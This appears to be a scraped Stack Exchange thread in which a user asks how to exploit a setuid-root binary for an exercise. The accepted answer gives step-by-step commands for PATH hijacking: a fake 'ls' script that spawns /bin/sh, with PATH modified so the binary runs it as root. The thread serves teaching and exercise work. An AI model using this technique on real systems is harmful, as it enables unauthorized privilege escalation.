{
    "title": "How to exploit an suid root application",
    "link": "https://reverseengineering.stackexchange.com/questions/17576/how-to-exploit-an-suid-root-application",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I have to exploit an application and I have only the 32-bit ELF excecutable, which is also stripped. Its a suid root application and when it is executed practically run the\n  <code>\n   ls -al\n  </code>\n  command for a specific directory that normally is inaccessible for normal users.\n </p>\n <p>\n  Any advice about how to handle this problem?\n </p>\n</div>\n</body></html>",
    "votes": "1",
    "answers": 1,
    "views": "4k",
    "tags": [
        "elf",
        "exploit"
    ],
    "user": "John Rewei",
    "time": "May 7, 2018 at 20:38",
    "comments": [
        {
            "user": "user23101",
            "text": "<html><body><span class=\"comment-copy\">\n what are the inputs that you control? can you effect the arguments of\n <code>\n  ls -al\n </code>\n ?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "joxeankoret",
            "text": "<html><body><span class=\"comment-copy\">\n Check for how can you influence that command, it's most likely a system() call. Environment variables and command line arguments are the candidates. However, without disassembly, it's impossible to say.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "John Rewei",
            "text": "<html><body><span class=\"comment-copy\">\n I have tried a lot of inputs with patterns but I cannot spot any influence in memory. I can show you disassembly but because of the fact that the file is stripped has no info about functions.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "<html><body><span class=\"comment-copy\">\n how do you know it's exploitable?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "John Rewei",
            "text": "<html><body><span class=\"comment-copy\">\n its an exercise and it says it is\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  If the program is setuid, you can use the fact that it is calling the command\n  <code>\n   ls -al /tmp\n  </code>\n  through\n  <code>\n   system()\n  </code>\n  from the\n  <code>\n   main()\n  </code>\n  function.\n </p>\n <ol>\n  <li>\n   <p>\n    Create a file\n    <code>\n     ls\n    </code>\n    which contains:\n   </p>\n   <pre><code>#!/bin/sh\n/bin/sh\n</code></pre>\n  </li>\n  <li>\n   <p>\n    Set it as an executable script:\n   </p>\n   <pre><code>#> chmod +x ./ls\n</code></pre>\n  </li>\n  <li>\n   <p>\n    Modify your\n    <code>\n     PATH\n    </code>\n    to point to the current directory:\n   </p>\n   <pre><code>#> export PATH=.:${PATH}\n</code></pre>\n  </li>\n  <li>\n   <p>\n    Run the weak software (where you have the fake\n    <code>\n     ls\n    </code>\n    script):\n   </p>\n   <pre><code>#> /path/to/test\n</code></pre>\n  </li>\n </ol>\n <p>\n  Just a remark, the rest of the software seems to have been obfuscated, at least by renaming the subroutines into\n  <code>\n   sub_xxxx\n  </code>\n  . It may also contain other obfuscations.\n </p>\n</div>\n</body></html>",
            "votes": "4",
            "user": "perror",
            "time": "Mar 19, 2018 at 14:50",
            "is_accepted": true,
            "comments": []
        }
    ]
}